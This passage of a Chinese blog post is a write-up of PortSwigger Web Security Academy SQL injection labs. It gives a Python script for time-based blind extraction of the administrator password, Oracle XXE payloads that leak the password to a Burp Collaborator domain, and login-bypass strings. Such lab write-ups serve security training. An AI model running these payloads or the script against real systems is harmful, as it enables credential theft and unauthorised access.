+<h2 id="构造payload-3"><a href="#构造payload-3" class="headerlink" title="构造payload"></a>构造payload</h2><p>可以直接在<br><code>irrik&#39; || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --+</code><br>的基础上进行修改<br>在条件处加上对密码的提取，比较<br>然后根据代码执行的时间来判断结果是否正确</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">"127.0.0.1:8081"</span>,</span><br><span class="line">           <span class="string">'https'</span>: <span class="string">'127.0.0.1:8081'</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://ac721fdc1ee60ac580e72015005f0061.web-security-academy.net/'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    low  = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid  = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low != high:</span><br><span class="line">        now = time.time()</span><br><span class="line">        payload = &#123;<span class="string">'TrackingId'</span>: <span class="string">f'a\'||(SELECT CASE WHEN (ascii(substr((select password from users where username=\'administrator\'),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)\</span></span><br><span class="line"><span class="string">             THEN pg_sleep(10) ELSE pg_sleep(0) END)--'</span>,</span><br><span class="line">         <span class="string">'session'</span>:<span class="string">'3uV3ouz1hJ7mG2TAcSik9Zu3lj8zp5dG'</span>&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="comment"># res = requests.get(url, headers=headers, cookies=payload, proxies=proxies, verify=False)</span></span><br><span class="line">        res = requests.get(url, headers=headers, cookies=payload)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> (time.time() - now) &gt; <span class="number">10</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  </span><br><span class="line">    </span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+<p>跑到的密码如下<br><img src="https://i.loli.net/2021/04/14/pOCzjTFh4G6m7Qw.png" alt="1.png"></p>
+<h1 id="Blind-SQL-injection-with-out-of-band-interaction"><a href="#Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Blind SQL injection with out-of-band interaction"></a>Blind SQL injection with out-of-band interaction</h1><h2 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain.<br>To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.</p>
+</blockquote>
+<p>这道题没办法根据返回的内容，或者返回的时间来做题<br>需要使用dnslog的方式来外带数据<br>这道题只需要触发一次外网访问就算成功<br>但是对目的域名做了限制，只能用pb pro来做</p>
+<p>这道题一开始是不会做的。。直接看了solution<br>注意把访问的http的url，改成自己的域名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x'+UNION+<span class="keyword">SELECT</span>+EXTRACTVALUE(<span class="keyword">xmltype</span>(<span class="string">'&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'</span>),<span class="string">'/l'</span>)+<span class="keyword">FROM</span>+dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>新建一个Burp Collaborator client<br><img src="https://i.loli.net/2021/04/14/ogC3OheAtz962lL.png" alt="1.png"><br>修改上面的payload为自己的Burp Collaborator client生成的域名<br><img src="https://i.loli.net/2021/04/14/7Od2Moe3z6qtSyH.png" alt="1.png"><br>这道题到这里就算过了。</p>
+<h1 id="Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="Blind SQL injection with out-of-band data exfiltration"></a>Blind SQL injection with out-of-band data exfiltration</h1><h2 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.<br>The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain.<br>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.<br>To solve the lab, log in as the administrator user.</p>
+</blockquote>
+<p>这道题和上一道题其实很相似<br>但是这道题出了要触发外网的访问还需要在里面带出数据</p>
+<p>看看上一道题的原始payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x'+UNION+<span class="keyword">SELECT</span>+EXTRACTVALUE(<span class="keyword">xmltype</span>(<span class="string">'&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'</span>),<span class="string">'/l'</span>)+<span class="keyword">FROM</span>+dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>在里面修改dnslog地址的同时<br>可以在url里面拼接sql语句<br>将sql语句执行返回的结果作为url的一部分<br>随后触发url的访问，在dns记录里即可看到带出的数据</p>
+<p>修改的payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x'+UNION+<span class="keyword">SELECT</span>+EXTRACTVALUE(<span class="keyword">xmltype</span>(<span class="string">'&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http://'</span>||(<span class="keyword">SELECT</span>+<span class="keyword">password</span>+<span class="keyword">FROM</span>+<span class="keyword">users</span>+<span class="keyword">WHERE</span>+username%<span class="number">3</span>d<span class="string">'administrator'</span>)||<span class="string">'.ojbw9knz9ij5940mio5m4icwtnzhn6.burpcollaborator.net/"&gt;+%25remote;]&gt;'</span>),<span class="string">'/l'</span>)+<span class="keyword">FROM</span>+dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>解释一下这个payload的结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmltype(&apos;&lt;?xml+version=&quot;1.0&quot;+encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http://&apos;||(SELECT+password+FROM+users+WHERE+username%3d&apos;administrator&apos;)||&apos;.ojbw9knz9ij5940mio5m4icwtnzhn6.burpcollaborator.net/&quot;&gt;+%25remote;]&gt;&apos;)</span><br></pre></td></tr></table></figure>
+<p>可以单独抽出来看<br>里面的参数大致可以分为3部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&lt;?xml+version=&quot;1.0&quot;+encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http://&apos;</span><br><span class="line">||(SELECT+password+FROM+users+WHERE+username%3d&apos;administrator&apos;)||</span><br><span class="line">&apos;.ojbw9knz9ij5940mio5m4icwtnzhn6.burpcollaborator.net/&quot;&gt;+%25remote;]&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>这样子看，三个部分都是独立的字符串，所以可以用||(ORACLE的字符拼接符号)连接起来。<br>这里需要注意的点是 %25(%的url编码) 这是不能简化为%的，不然xxe的语法会出错。<br>如图，可以密码是第一个子域<br><img src="https://i.loli.net/2021/04/14/jZJxl8syVnpzeiD.png" alt="1.png"></p>
+<h1 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h1><h2 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:<br>SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1<br>To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.</p>
+</blockquote>
+<p>这道题直接 <code>&#39; or 1=1 --</code> 就行</p>
+<h1 id="SQL-injection-vulnerability-allowing-login-bypass"><a href="#SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="SQL injection vulnerability allowing login bypass"></a>SQL injection vulnerability allowing login bypass</h1><h2 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>This lab contains an SQL injection vulnerability in the login function.<br>To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.</p>
+</blockquote>
+<p>这道题考的就是一个万能密码。。。<br><code>administrator&#39;--</code>密码随便<br>或者账号密码都填<br><code>1&#39;or&#39;1&#39;=&#39;1</code><br>这个其实会登录第一个用户<br>但是大多数数据库第一个用户就是管理员</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">https://portswigger.net/web-security/sql-injection</a><br><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">https://portswigger.net/web-security/sql-injection/cheat-sheet</a><br><a href="https://www.techonthenet.com/oracle/functions/case.php" target="_blank" rel="noopener">https://www.techonthenet.com/oracle/functions/case.php</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/28/java%E6%B3%A8%E8%A7%A3%E5%AD%A6%E4%B9%A0/" rel="next" title="java注解学习">
+                <i class="fa fa-chevron-left"></i> java注解学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/04/15/%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0%E8%AE%A1%E5%88%92%E4%B9%8Bxss/" rel="prev" title="回炉重造计划之xss">
+                回炉重造计划之xss <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="nav-number">1.</span> <span class="nav-text">SQL injection UNION attack, determining the number of columns returned by the query</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定注入点"><span class="nav-number">1.2.</span> <span class="nav-text">确定注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数"><span class="nav-number">1.3.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造payload"><span class="nav-number">1.4.</span> <span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-UNION-attack-finding-a-column-containing-text"><span class="nav-number">2.</span> <span class="nav-text">SQL injection UNION attack, finding a column containing text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-1"><span class="nav-number">2.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定兼容字符串的列"><span class="nav-number">2.3.</span> <span class="nav-text">确定兼容字符串的列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-UNION-attack-retrieving-data-from-other-tables"><span class="nav-number">3.</span> <span class="nav-text">SQL injection UNION attack, retrieving data from other tables</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-2"><span class="nav-number">3.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-2"><span class="nav-number">3.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定能回显字符串的列"><span class="nav-number">3.3.</span> <span class="nav-text">确定能回显字符串的列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="nav-number">4.</span> <span class="nav-text">SQL injection UNION attack, retrieving multiple values in a single column</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-3"><span class="nav-number">4.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-3"><span class="nav-number">4.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断可以回显字符串的列"><span class="nav-number">4.3.</span> <span class="nav-text">判断可以回显字符串的列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><span class="nav-number">5.</span> <span class="nav-text">SQL injection attack, querying the database type and version on Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-4"><span class="nav-number">5.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断列"><span class="nav-number">5.2.</span> <span class="nav-text">判断列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断可以回显字符串的列-1"><span class="nav-number">5.3.</span> <span class="nav-text">判断可以回显字符串的列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="nav-number">6.</span> <span class="nav-text">SQL injection attack, querying the database type and version on MySQL and Microsoft</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-5"><span class="nav-number">6.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-4"><span class="nav-number">6.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定可以回显字符串的列"><span class="nav-number">6.3.</span> <span class="nav-text">确定可以回显字符串的列</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><span class="nav-number">7.</span> <span class="nav-text">SQL injection attack, listing the database contents on non-Oracle databases</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-6"><span class="nav-number">7.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-5"><span class="nav-number">7.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定能回显字符串的列-1"><span class="nav-number">7.3.</span> <span class="nav-text">确定能回显字符串的列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定后端DMBS"><span class="nav-number">7.4.</span> <span class="nav-text">确定后端DMBS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表名"><span class="nav-number">7.5.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表中字段"><span class="nav-number">7.6.</span> <span class="nav-text">查表中字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取数据"><span class="nav-number">7.7.</span> <span class="nav-text">取数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="nav-number">8.</span> <span class="nav-text">SQL injection attack, listing the database contents on Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-7"><span class="nav-number">8.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定列数-6"><span class="nav-number">8.2.</span> <span class="nav-text">确定列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定可以回显字符串的列-1"><span class="nav-number">8.3.</span> <span class="nav-text">确定可以回显字符串的列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表名-1"><span class="nav-number">8.4.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查询列名"><span class="nav-number">8.5.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取数据-1"><span class="nav-number">8.6.</span> <span class="nav-text">取数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-conditional-responses"><span class="nav-number">9.</span> <span class="nav-text">Blind SQL injection with conditional responses</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-8"><span class="nav-number">9.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定DBMS"><span class="nav-number">9.2.</span> <span class="nav-text">确定DBMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造payload-1"><span class="nav-number">9.3.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动化查询"><span class="nav-number">9.4.</span> <span class="nav-text">自动化查询</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-conditional-errors"><span class="nav-number">10.</span> <span class="nav-text">Blind SQL injection with conditional errors</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-9"><span class="nav-number">10.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断DMBS"><span class="nav-number">10.2.</span> <span class="nav-text">判断DMBS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造payload-2"><span class="nav-number">10.3.</span> <span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-time-delays"><span class="nav-number">11.</span> <span class="nav-text">Blind SQL injection with time delays</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-10"><span class="nav-number">11.1.</span> <span class="nav-text">题目描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="nav-number">12.</span> <span class="nav-text">Blind SQL injection with time delays and information retrieval</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-11"><span class="nav-number">12.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定DBMS-1"><span class="nav-number">12.2.</span> <span class="nav-text">确定DBMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造payload-3"><span class="nav-number">12.3.</span> <span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-out-of-band-interaction"><span class="nav-number">13.</span> <span class="nav-text">Blind SQL injection with out-of-band interaction</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-12"><span class="nav-number">13.1.</span> <span class="nav-text">题目描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="nav-number">14.</span> <span class="nav-text">Blind SQL injection with out-of-band data exfiltration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-13"><span class="nav-number">14.1.</span> <span class="nav-text">题目描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="nav-number">15.</span> <span class="nav-text">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-14"><span class="nav-number">15.1.</span> <span class="nav-text">题目描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-injection-vulnerability-allowing-login-bypass"><span class="nav-number">16.</span> <span class="nav-text">SQL injection vulnerability allowing login bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-15"><span class="nav-number">16.1.</span> <span class="nav-text">题目描述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">17.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">153.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
